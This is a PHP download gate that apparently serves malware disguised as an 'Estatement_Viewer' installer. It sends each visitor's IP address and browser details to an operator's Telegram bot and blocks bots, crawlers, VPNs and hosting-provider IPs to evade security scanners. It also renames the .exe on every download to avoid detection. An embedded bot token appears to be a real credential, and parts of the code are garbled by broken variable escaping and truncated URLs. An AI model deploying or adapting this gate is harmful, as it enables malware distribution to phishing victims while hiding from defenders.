<?php
// =========================================================================
// CONFIGURATION - REPLACE THESE VARIABLES WITH YOUR ACTUAL TELEGRAM DETAILS
// =========================================================================
define('TELEGRAM_BOT_TOKEN', '8128913412:AAEYGvEAFh8JKYKVe9tk0g-tWZe9HH1jSs0'); // Put your token between quotes
define('TELEGRAM_CHAT_ID', '930774518');     // Put your chat ID between quotes
define('COMPANY_NAME', 'prkgroup');                 // Your company name prefix

// =========================================================================
// HELPER FUNCTION: SEND MESSAGE TO TELEGRAM
// =========================================================================
function sendTelegramNotification(\$message) {
    if (TELEGRAM_BOT_TOKEN === '8128913412:AAEYGvEAFh8JKYKVe9tk0g-tWZe9HH1jSs0' || TELEGRAM_CHAT_ID === '930774518') {
        return; // Skip if configuration isn't updated yet
    }

    \$data = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => \$message,
        'parse_mode' => 'Markdown'
    ];

    \$url = "https://telegram.org" . TELEGRAM_BOT_TOKEN . "/sendMessage?" . http_build_query(\(data);\)options = [
        'http' => [
            'method' => 'GET',
            'timeout' => 3 // Quick timeout to ensure user download remains fast
        ]
    ];
    \(context = stream_context_create(\)options);
    @file_get_contents(\(url, false,\)context);
}

// =========================================================================
// 1. DETERMINE REAL VISITOR IP AND DETAILS
// =========================================================================
\(visitorIp =\)_SERVER['REMOTE_ADDR'];

// Adjust IP acquisition if the site uses Cloudflare or a reverse proxy
if (isset(\$_SERVER['HTTP_CF_CONNECTING_IP'])) {
    \(visitorIp =\)_SERVER['HTTP_CF_CONNECTING_IP'];
} elseif (isset(\$_SERVER['HTTP_X_FORWARDED_FOR'])) {
    \(ipArray = explode(',',\)_SERVER['HTTP_X_FORWARDED_FOR']);
    \(visitorIp = trim(\)ipArray[0]);
}

\$userAgent = isset(\(_SERVER['HTTP_USER_AGENT']) ?\)_SERVER['HTTP_USER_AGENT'] : 'Unknown User-Agent';

// [NOTIFICATION 1] Alert that the link was accessed
\$visitAlert = "🔔 *Link Opened*\n"
            . "🌐 *IP:* `$visitorIp`\n"
            . "📱 *Device/Browser:* `$userAgent`";
sendTelegramNotification(\$visitAlert);

// =========================================================================
// 2. ANTI-BOT / PROXY / VPS / RDP DETECTION BLOCK
// =========================================================================
// Basic local User-Agent keyword filter
\(botKeywords = ['bot', 'crawl', 'spider', 'slurp', 'scraper', 'curl', 'wget', 'python', 'selenium', 'puppeteer'];\)lowerUA = strtolower(\(userAgent);\)isBotUA = false;

foreach (\(botKeywords as\)keyword) {
    if (strpos(\$lowerUA, \(keyword) !== false) {\)isBotUA = true;
        break;
    }
}

if (empty(\(lowerUA) \vert{}\vert{}\)isBotUA) {
    sendTelegramNotification("❌ *Access Blocked:* Known automated tool or empty User-Agent detected.\n🌐 *IP:* `$visitorIp`");
    header('HTTP/1.0 403 Forbidden');
    echo "Access Denied: Automated tools are not permitted.";
    exit;
}

// Live IP API Check to filter out Data Centers, Hosting providers, Proxies, and VPNs
\(apiUrl = "http://ip-api.com" . trim(\)visitorIp) . "?fields=hosting,proxy,status,country";
\(apiResponse = @file_get_contents(\)apiUrl);

if (\$apiResponse) {
    \(ipData = json_decode(\)apiResponse, true);
    
    if (isset(\$ipData['status']) && \(ipData['status'] === 'success') {\)country = isset(\(ipData['country']) ?\)ipData['country'] : 'Unknown';
        
        // Block if flagged as data center hosting (VPS/RDP farms) or a commercial proxy
        if (!empty(\$ipData['hosting']) || !empty(\(ipData['proxy'])) {\)blockAlert = "❌ *Download Blocked* (Non-Residential Network)\n"
                        . "🌐 *IP:* `$visitorIp`\n"
                        . "🌍 *Country:* `$country`\n"
                        . "⚠️ *Reason:* VPS / Proxy / RDP detected.";
            sendTelegramNotification(\$blockAlert);
            
            header('HTTP/1.0 403 Forbidden');
            echo "Access Denied: Connections from commercial hosting providers, VPNs, or proxies are restricted.";
            exit;
        }
    }
}

// =========================================================================
// 3. FILE DELIVERY WITH DYNAMIC RENAMING
// =========================================================================
\$realFilePath = 'Estatement_Viewer.msi';

if (file_exists(\$realFilePath)) {
    // Generate a completely unique filename suffix for every request
    \$uniqueID = time() . '_' . rand(1000, 9999);
    \(dynamicName = COMPANY_NAME . "_Setup_" . \)uniqueID . ".exe";

    // [NOTIFICATION 2] Send confirmation that the download stream has started
    \$downloadAlert = "🚀 *File Downloading Successfully*\n"
                   . "📦 *Generated Name:* `$dynamicName`\n"
                   . "🌐 *IP:* `$visitorIp` (" . (\$country ?? 'Checked') . ")";
    sendTelegramNotification(\$downloadAlert);

    // Clear any active output buffers to prevent binary file corruption
    if (ob_get_level()) {
        ob_end_clean();
    }

    // Set precise binary stream headers to force download under the dynamic name
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . \$dynamicName . '"');
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize(\$realFilePath));
    
    // Output the file contents directly from the disk stream
    readfile(\$realFilePath);
    exit;
    
} else {
    // Error Handling if the target file is missing on the server storage
    \$errorAlert = "⚠️ *Critical Error:* A visitor attempted to download the file, but `Estatement_Viewer.msi` was missing on your server storage.";
    sendTelegramNotification(\$errorAlert);
    
    header("HTTP/1.0 404 Not Found");
    echo "Error: The requested asset is temporarily offline. Please contact support.";
}
?>
